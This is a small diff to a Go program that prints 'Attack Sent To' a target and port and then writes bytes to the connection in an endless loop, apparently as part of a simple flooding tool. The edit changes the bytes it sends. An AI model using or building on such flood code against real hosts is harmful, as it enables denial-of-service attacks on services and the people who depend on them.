@@ -15,7 +15,7 @@ func main() {
 	} else {
 		fmt.Println("Attack Sent To " + target + ":" + port)
 		for {
-			conn.Write([]byte("\x61\x73\x64"))
+			conn.Write([]byte("\x31"))
 		}
 	}
 }
